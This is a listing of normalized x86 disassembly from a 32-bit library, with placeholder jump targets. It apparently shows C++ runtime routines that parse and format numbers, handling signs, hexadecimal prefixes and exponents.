or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_100063a3
push 0x38
mov eax sub_1004d8fa
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10003446
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100070f8
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023c74
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_10006451
push 0x38
mov eax sub_1004d8fa
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10003446
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100070f8
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023ad9
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_100064ff
push 0x3c
mov eax sub_1004d67d
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10003446
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100070f8
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023d19
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_100065b6
push 0x3c
mov eax sub_1004d67d
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10003446
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100070f8
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023ddc
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_1000666d
push 0x50
mov eax sub_1004d8cd
call sub_1002826c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10003446
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x54 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x50 ]
call sub_10007448
add esp 0x14
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10023fe1
fstp [ ebp - 0x50 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x58 ]
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x5c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
fld [ ebp - 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_100282ef
retn 0x20
sub_10006715
push 0x54
mov eax sub_1004d8a0
call sub_1002826c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10003446
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_10007448
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10024003
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_100282ef
retn 0x20
sub_100067bd
push 0x54
mov eax sub_1004d8a0
call sub_1002826c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10003446
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_10007448
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1002406c
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_100282ef
retn 0x20
sub_10006865
push 0x38
mov eax sub_1004c597
call sub_1002826c
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10003446
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100070f8
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10003c49
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023ad9
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_100282ef
retn 0x20
sub_10006941
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004d64d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x68 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x80 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ esp + 0x38 ] eax
lea eax [ esp + 0x3c ]
push eax
mov [ esp + 0x28 ] ecx
call sub_10003446
and [ esp + 0x88 ] 0x0
push eax
call sub_10007ea3
or [ esp + 0x8c ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ esp + 0x3c ]
mov [ esp + 0x30 ] ebx
call sub_10003c49
lea eax [ esp + 0x5c ]
push eax
mov ecx ebx
call sub_1000c088
mov [ esp + 0x88 ] 0x1
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
xor ebx ebx
push ebx
lea ecx [ esp + 0x44 ]
mov [ esp + 0x2c ] eax
mov [ esp + 0x5c ] 0xf
call sub_10002004
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
mov [ esp + 0x94 ] 0x2
call sub_100087f2
movzx eax ax
mov [ esp + 0x2c ] eax
mov al [ esi ]
add esp 0xc
cmp al 0x2b
je r-xdata
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x2c ] ebx
cmp al 0x2d
jne r-xdata
cmp [ esp + 0x74 ] 0x10
mov eax [ esp + 0x60 ]
jae r-xdata
mov [ ebp + 0x2c ] ebx
call sub_10024c18
mov eax [ eax ]
push [ ebp + 0x30 ]
mov al [ eax ]
push 0x65
push esi
mov [ esp + 0x20 ] al
mov [ esp + 0x21 ] 0x65
mov [ esp + 0x22 ] 0x0
call sub_10024c40
push [ ebp + 0x30 ]
mov [ esp + 0x20 ] eax
movsx eax [ esp + 0x24 ]
push eax
push esi
call sub_10024c40
add esp 0x18
mov [ esp + 0x18 ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ esp + 0x60 ]
mov ecx [ ebp + 0x28 ]
mov eax [ ebp + 0x24 ]
mov edx [ esp + 0x24 ]
add eax ecx
add eax [ ebp + 0x2c ]
mov ecx [ edx + 0x18 ]
add eax [ ebp + 0x30 ]
cmp ecx ebx
jle r-xdata
cmp [ esp + 0x74 ] 0x10
mov eax [ esp + 0x60 ]
jae r-xdata
mov [ esp + 0x10 ] ebx
cmp ecx eax
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ esp + 0x60 ]
movsx eax [ esp + 0x14 ]
push [ ebp + 0x30 ]
push eax
push esi
call sub_10024c40
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
sub ecx eax
mov [ esp + 0x10 ] ecx
jmp r-xdata
push [ ebp + 0x30 ]
lea ecx [ esp + 0x44 ]
push esi
call sub_10008756
mov eax [ esp + 0x10 ]
cmp eax ebx
jne r-xdata
push [ ebp + 0x30 ]
push 0x65
push esi
call sub_10024c40
add esp 0xc
cmp eax ebx
je r-xdata
push [ esp + 0x28 ]
sub eax esi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ esp + 0x28 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10007bbc
mov ecx [ eax ]
push [ ebp + 0x24 ]
mov [ ebp + 0x10 ] ecx
push [ esp + 0x40 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x44 ]
push eax
push edi
call sub_100070cf
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ esp + 0x64 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
movzx eax ax
push 0x1
push eax
push [ ebp + 0x14 ]
lea eax [ esp + 0x3c ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_100070cf
mov ecx [ eax ]
push [ ebp + 0x28 ]
mov [ ebp + 0x10 ] ecx
push [ esp + 0x3c ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x58 ]
push eax
push edi
call sub_100070cf
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x30
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ esp + 0x10 ]
lea eax [ esp + 0x1c ]
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_100070cf
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ esp + 0x28 ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ esp + 0x2c ] ebx
jbe r-xdata
mov eax [ edx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ esp + 0x18 ] ebx
jne r-xdata
push 0x30
push [ ebp + 0x2c ]
lea ecx [ esp + 0x48 ]
call sub_10007a24
jmp r-xdata
push [ esp + 0x28 ]
lea eax [ esp + 0x34 ]
push [ ebp + 0x30 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10007bbc
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
push [ esp + 0x40 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x44 ]
push eax
push edi
call sub_100070cf
mov ecx [ eax ]
push [ esp + 0x44 ]
mov edx [ esp + 0x5c ]
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ esp + 0x7c ]
mov [ ebp + 0x14 ] eax
push edi
mov [ edx + 0x18 ] ebx
call sub_100070cf
add esp 0x4c
push ebx
push 0x1
lea ecx [ esp + 0x48 ]
call sub_10002020
push ebx
push 0x1
lea ecx [ esp + 0x64 ]
call sub_10002020
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x80 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x68 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
push [ esp + 0x28 ]
sub eax esi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ esp + 0x40 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10007bbc
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
push [ esp + 0x40 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x5c ]
push eax
push edi
call sub_100070cf
mov ecx [ eax ]
and [ ebp + 0x2c ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
mov ecx [ esp + 0x58 ]
add esp 0x34
test [ ecx + 0x10 ] 0x4
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ esp + 0x24 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10007b71
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp + 0x30 ]
mov [ ebp + 0x14 ] eax
push 0x30
push [ ebp + 0x2c ]
sub eax esi
push eax
lea ecx [ esp + 0x4c ]
call sub_10007a72
push 0x30
push [ ebp + 0x24 ]
lea ecx [ esp + 0x48 ]
call sub_10007a24
mov eax [ esp + 0x10 ]
mov [ ebp + 0x24 ] ebx
mov eax [ esp + 0x18 ]
push 0x30
lea ecx [ esp + 0x44 ]
cmp eax ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x40 ]
push eax
push edi
call sub_10007b71
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
push [ ebp + 0x28 ]
sub eax esi
mov [ esp + 0x20 ] eax
inc eax
push eax
call sub_10007a72
push 0x30
push [ ebp + 0x24 ]
lea ecx [ esp + 0x48 ]
push [ esp + 0x20 ]
call sub_10007a72
mov [ ebp + 0x28 ] ebx
push [ ebp + 0x24 ]
call sub_10007a24
jmp r-xdata
lea eax [ esp + 0x14 ]
push eax
push ebx
lea ecx [ esp + 0x48 ]
call sub_10007b0c
push eax
call sub_10024cf0
pop ecx
pop ecx
mov [ esp + 0x10 ] eax
jmp r-xdata
lea esi [ esp + 0x60 ]
cmp [ esp + 0x74 ] 0x10
mov esi [ esp + 0x60 ]
mov [ ebp + 0x24 ] ebx
jae r-xdata
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
push ebx
lea ecx [ esp + 0x44 ]
call sub_10007b0c
mov esi eax
mov eax [ esp + 0x54 ]
mov [ ebp + 0x2c ] ebx
mov [ ebp + 0x30 ] eax
mov ecx [ esp + 0x10 ]
sub ecx [ esp + 0x2c ]
movsx eax al
cmp eax ecx
jae r-xdata
sub [ esp + 0x10 ] eax
push ebx
push 0x1
push [ esp + 0x18 ]
lea ecx [ esp + 0x4c ]
call sub_10007a72
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_10006e41
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004d870
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ esp + 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x30 ]
push eax
mov ecx ebx
mov [ esp + 0x24 ] ebx
call sub_10003446
and [ esp + 0x60 ] 0x0
push eax
call sub_10007ea3
or [ esp + 0x64 ] 0xffffffff
pop ecx
lea ecx [ esp + 0x30 ]
mov [ esp + 0x2c ] eax
call sub_10003c49
mov ecx [ esp + 0x2c ]
lea eax [ esp + 0x34 ]
push eax
call sub_1000c088
xor ecx ecx
inc ecx
mov [ esp + 0x60 ] ecx
mov al [ esi ]
cmp al 0x2b
je r-xdata
mov [ esp + 0x18 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ esp + 0x38 ]
cmp al 0x30
jne r-xdata
mov edi [ ebx + 0x18 ]
test edi edi
jle r-xdata
cmp [ esp + 0x4c ] 0x10
mov eax ecx
jae r-xdata
and [ esp + 0x18 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor edi edi
cmp edi [ ebp + 0x24 ]
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ esp + 0x38 ]
cmp [ esp + 0x4c ] 0x10
mov ecx [ esp + 0x38 ]
mov eax ecx
jae r-xdata
mov [ esp + 0x18 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ esp + 0x2c ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
push eax
push [ ebp + 0x24 ]
lea eax [ esp + 0x20 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ esp + 0x28 ]
call sub_10007bbc
mov ecx [ eax ]
push edi
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
and [ ebx + 0x18 ] 0x0
push eax
push ecx
push [ esp + 0x54 ]
mov [ ebp + 0x14 ] eax
push [ esp + 0x40 ]
call sub_100070cf
add esp 0x34
push 0x0
push 0x1
lea ecx [ esp + 0x3c ]
call sub_10002020
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
cmp eax 0x100
lea eax [ esp + 0x20 ]
je r-xdata
sub edi [ ebp + 0x24 ]
jmp r-xdata
cmp [ esp + 0x4c ] 0x10
jb r-xdata
push [ esp + 0x18 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ esp + 0x24 ]
call sub_10007b71
mov ecx [ eax ]
push edi
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ esp + 0x3c ]
push [ eax ]
sub [ ebp + 0x24 ] ecx
lea eax [ esp + 0x48 ]
push eax
push [ esp + 0x3c ]
add esi ecx
call sub_100070cf
add esp 0x30
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ esp + 0x24 ]
call sub_100070cf
add esp 0x18
jmp r-xdata
mov eax [ ebx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
lea eax [ esp + 0x38 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x14 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
mov [ ebp + 0x14 ] eax
mov eax [ esp + 0x14 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov edi [ ebp + 0x24 ]
jmp r-xdata
test al al
jle r-xdata
mov ecx edi
sub ecx [ esp + 0x18 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp + 0x24 ]
sub eax edi
inc eax
push eax
lea ebx [ esi + edi ]
push ebx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
call sub_100245ce
mov eax [ esp + 0x24 ]
add esp 0x10
inc [ ebp + 0x24 ]
inc eax
mov [ ebx ] 0x0
cmp [ eax ] 0x0
jle r-xdata
mov ebx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
sub_1000709a
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_10007c55
dec [ ebp + 0x1c ]
inc esi
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_100070cf
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_10007c55
dec [ ebp + 0x1c ]
jne r-xdata
sub_100070f8
push 0x64
mov eax sub_1004c218
call sub_1002826c
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_10007ea3
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_1000c088
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x34 ] eax
je r-xdata
lea ebx [ esi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] ebx
call sub_100087f2
mov esi [ ebp - 0x6c ]
add esp 0xc
push [ ebp - 0x5c ]
movzx eax ax
mov ecx edi
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x54 ] esi
call sub_100081f6
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
push ebx
push 0x0
push 0x2b
call sub_100087f2
add esp 0xc
mov ecx edi
mov bx ax
call sub_10007c7b
cmp ax bx
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
